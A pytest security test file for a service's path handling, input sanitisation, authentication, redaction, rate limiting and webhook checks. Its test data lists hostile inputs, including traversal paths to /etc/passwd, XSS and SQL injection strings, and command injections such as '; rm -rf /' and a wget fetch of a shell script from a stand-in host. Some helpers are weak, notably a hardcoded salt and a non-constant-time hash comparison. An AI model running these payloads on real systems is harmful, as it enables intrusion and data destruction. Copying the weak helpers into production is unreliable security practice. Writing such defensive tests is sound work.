"""
Security Tests
==============

Comprehensive security testing for creator protection.
Every vulnerability fixed is a creator protected.
"""

import pytest
import hashlib
import hmac
import re
from typing import Dict, Any
from pathlib import Path


class TestPathTraversal:
    """Test protection against path traversal attacks."""

    def test_basic_path_traversal_blocked(self):
        """Basic path traversal attempts should be blocked."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
        ]

        for path in dangerous_paths:
            assert not self._is_safe_path(path)

    def test_null_byte_injection_blocked(self):
        """Null byte injection should be blocked."""
        dangerous_paths = [
            "video.mp4\x00.txt",
            "video\x00../../etc/passwd",
        ]

        for path in dangerous_paths:
            assert not self._is_safe_path(path)

    def test_symbolic_link_not_followed(self):
        """Symbolic links should not be followed outside allowed directory."""
        # In real implementation, would check actual symlink behavior
        allowed_dir = "/var/videos"
        symlink_target = "/etc/passwd"

        # Simulated symlink check
        is_within_allowed = symlink_target.startswith(allowed_dir)
        assert not is_within_allowed

    def test_allowed_paths_work(self):
        """Valid paths within allowed directory should work."""
        valid_paths = [
            "video.mp4",
            "user123/video.mp4",
            "2025/12/video.mp4",
        ]

        for path in valid_paths:
            assert self._is_safe_path(path)

    def _is_safe_path(self, path: str) -> bool:
        """Check if path is safe."""
        # Reject null bytes
        if "\x00" in path:
            return False

        # Reject path traversal
        if ".." in path:
            return False

        # Reject URL-encoded traversal
        if "%2f" in path.lower() or "%2e" in path.lower():
            return False

        return True


class TestInputSanitization:
    """Test input sanitization against injection attacks."""

    def test_xss_in_prompt_sanitized(self):
        """XSS attempts in prompts should be sanitized."""
        xss_attempts = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
        ]

        for attempt in xss_attempts:
            sanitized = self._sanitize_html(attempt)
            assert "<script>" not in sanitized
            assert "onerror=" not in sanitized
            assert "javascript:" not in sanitized

    def test_sql_injection_prevented(self):
        """SQL injection attempts should be prevented."""
        sql_attempts = [
            "'; DROP TABLE videos; --",
            "1 OR 1=1",
            "1; UPDATE users SET admin=1;",
            "' UNION SELECT * FROM users --",
        ]

        for attempt in sql_attempts:
            # In parameterized queries, these would be treated as literals
            safe = self._parameterize(attempt)
            assert safe == attempt  # Value is preserved but safe

    def test_command_injection_blocked(self):
        """Command injection attempts should be blocked."""
        command_attempts = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& wget malicious.com/shell.sh",
        ]

        for attempt in command_attempts:
            assert not self._is_safe_command_input(attempt)

    def test_header_injection_blocked(self):
        """HTTP header injection should be blocked."""
        header_attempts = [
            "value\r\nX-Injected: true",
            "value\nSet-Cookie: session=stolen",
        ]

        for attempt in header_attempts:
            sanitized = self._sanitize_header(attempt)
            assert "\r" not in sanitized
            assert "\n" not in sanitized

    def _sanitize_html(self, text: str) -> str:
        """Sanitize HTML/XSS."""
        # Simple sanitization - real implementation would use a library
        text = text.replace("<", "&lt;").replace(">", "&gt;")
        text = re.sub(r'javascript:', '', text, flags=re.I)
        text = re.sub(r'on\w+\s*=', '', text, flags=re.I)
        return text

    def _parameterize(self, value: str) -> str:
        """Simulate parameterized query (value is treated as literal)."""
        return value

    def _is_safe_command_input(self, text: str) -> bool:
        """Check if input is safe for command usage."""
        dangerous = [";", "|", "&", "$", "`", "(", ")", "{", "}"]
        return not any(c in text for c in dangerous)

    def _sanitize_header(self, value: str) -> str:
        """Sanitize header value."""
        return value.replace("\r", "").replace("\n", "")


class TestAuthentication:
    """Test authentication security."""

    def test_api_key_format_validation(self):
        """API keys should have valid format."""
        valid_keys = [
            "sk_live_abcdef1234567890",
            "sk_test_xyz789abc123",
        ]
        invalid_keys = [
            "",
            "short",
            "no_prefix_key123456",
            "sk_live_" + "x" * 200,  # Too long
        ]

        for key in valid_keys:
            assert self._is_valid_api_key_format(key)

        for key in invalid_keys:
            assert not self._is_valid_api_key_format(key)

    def test_password_hashing(self):
        """Passwords should be hashed securely."""
        password = "user_password_123"

        # Hash with salt
        hashed = self._hash_password(password)

        # Same password should produce same hash
        assert self._verify_password(password, hashed)

        # Different password should not match
        assert not self._verify_password("wrong_password", hashed)

    def test_timing_safe_comparison(self):
        """Token comparison should be timing-safe."""
        token1 = "abc123def456"
        token2 = "abc123def456"
        token3 = "xyz789ghi012"

        # Should use constant-time comparison
        assert hmac.compare_digest(token1, token2)
        assert not hmac.compare_digest(token1, token3)

    def test_rate_limit_on_auth_failures(self):
        """Auth failures should trigger rate limiting."""
        failures = []

        def attempt_login(user: str, password: str) -> bool:
            if len(failures) >= 5:
                raise Exception("Rate limited")
            if password != "correct":
                failures.append(user)
                return False
            return True

        for i in range(6):
            try:
                attempt_login("user", "wrong")
            except Exception as e:
                assert "Rate limited" in str(e)
                break

        assert len(failures) == 5

    def _is_valid_api_key_format(self, key: str) -> bool:
        """Validate API key format."""
        if not key or len(key) < 20 or len(key) > 100:
            return False
        if not key.startswith(("sk_live_", "sk_test_")):
            return False
        return True

    def _hash_password(self, password: str) -> str:
        """Hash password with salt."""
        salt = "random_salt_here"
        return hashlib.pbkdf2_hmac(
            'sha256',
            password.encode(),
            salt.encode(),
            100000
        ).hex()

    def _verify_password(self, password: str, hashed: str) -> bool:
        """Verify password against hash."""
        return self._hash_password(password) == hashed


class TestDataProtection:
    """Test data protection measures."""

    def test_pii_not_logged(self):
        """PII should not appear in logs."""
        log_entry = self._create_log_entry({
            "user_id": "user123",
            "email": "user@example.com",
            "api_key": "sk_live_secret123",
            "prompt": "Create a video"
        })

        assert "user@example.com" not in log_entry
        assert "sk_live_secret123" not in log_entry
        assert "user123" in log_entry  # User ID is ok
        assert "Create a video" in log_entry  # Prompt is ok

    def test_sensitive_fields_redacted(self):
        """Sensitive fields should be redacted in responses."""
        response = {
            "user": {
                "id": "123",
                "email": "hidden",
                "created_at": "2025-01-01"
            },
            "api_key": "hidden"
        }

        redacted = self._redact_sensitive(response)

        assert redacted["user"]["email"] == "[REDACTED]"
        assert redacted["api_key"] == "[REDACTED]"
        assert redacted["user"]["id"] == "123"

    def test_secrets_not_in_error_messages(self):
        """Secrets should not appear in error messages."""
        secret = "sk_live_secret123"

        error_msg = self._create_error_message(f"Auth failed for {secret}")

        assert secret not in error_msg
        assert "sk_live_***" in error_msg or "[REDACTED]" in error_msg

    def _create_log_entry(self, data: Dict[str, Any]) -> str:
        """Create log entry with PII redacted."""
        safe_data = data.copy()
        if "email" in safe_data:
            safe_data["email"] = "[REDACTED]"
        if "api_key" in safe_data:
            safe_data["api_key"] = "[REDACTED]"
        return str(safe_data)

    def _redact_sensitive(self, data: Dict) -> Dict:
        """Redact sensitive fields."""
        sensitive_fields = ["email", "api_key", "password", "token"]
        result = {}

        for key, value in data.items():
            if isinstance(value, dict):
                result[key] = self._redact_sensitive(value)
            elif key in sensitive_fields:
                result[key] = "[REDACTED]"
            else:
                result[key] = value

        return result

    def _create_error_message(self, msg: str) -> str:
        """Create error message with secrets redacted."""
        # Redact API keys
        msg = re.sub(r'sk_(live|test)_\w+', 'sk_\\1_***', msg)
        return msg


class TestRateLimiting:
    """Test rate limiting security."""

    def test_rate_limit_enforced(self):
        """Rate limits should be enforced."""
        requests = []
        limit = 10

        def make_request():
            if len(requests) >= limit:
                return 429  # Too Many Requests
            requests.append(1)
            return 200

        for i in range(15):
            status = make_request()
            if i < limit:
                assert status == 200
            else:
                assert status == 429

    def test_rate_limit_per_user(self):
        """Rate limits should be per-user."""
        user_requests: Dict[str, int] = {}
        limit = 10

        def make_request(user_id: str):
            user_requests.setdefault(user_id, 0)
            if user_requests[user_id] >= limit:
                return 429
            user_requests[user_id] += 1
            return 200

        # User 1 hits limit
        for i in range(12):
            make_request("user1")

        # User 2 should still have quota
        assert make_request("user2") == 200

    def test_rate_limit_headers_present(self):
        """Rate limit headers should be present."""
        headers = {
            "X-RateLimit-Limit": "100",
            "X-RateLimit-Remaining": "95",
            "X-RateLimit-Reset": "1703059200"
        }

        assert "X-RateLimit-Limit" in headers
        assert "X-RateLimit-Remaining" in headers
        assert "X-RateLimit-Reset" in headers


class TestWebhookSecurity:
    """Test webhook security."""

    def test_webhook_signature_required(self):
        """Webhooks should require valid signatures."""
        payload = '{"event": "task.completed"}'
        secret = "webhook_secret_123"

        # Generate signature
        signature = hmac.new(
            secret.encode(),
            payload.encode(),
            hashlib.sha256
        ).hexdigest()

        # Verify
        assert self._verify_webhook(payload, f"sha256={signature}", secret)

    def test_invalid_signature_rejected(self):
        """Invalid signatures should be rejected."""
        payload = '{"event": "task.completed"}'
        secret = "webhook_secret_123"

        assert not self._verify_webhook(payload, "sha256=invalid", secret)

    def test_replay_attack_prevention(self):
        """Replay attacks should be prevented."""
        used_nonces = set()

        def process_webhook(nonce: str) -> bool:
            if nonce in used_nonces:
                return False  # Replay detected
            used_nonces.add(nonce)
            return True

        # First use
        assert process_webhook("nonce123") is True

        # Replay attempt
        assert process_webhook("nonce123") is False

    def _verify_webhook(self, payload: str, signature: str, secret: str) -> bool:
        """Verify webhook signature."""
        expected = hmac.new(
            secret.encode(),
            payload.encode(),
            hashlib.sha256
        ).hexdigest()
        return hmac.compare_digest(f"sha256={expected}", signature)
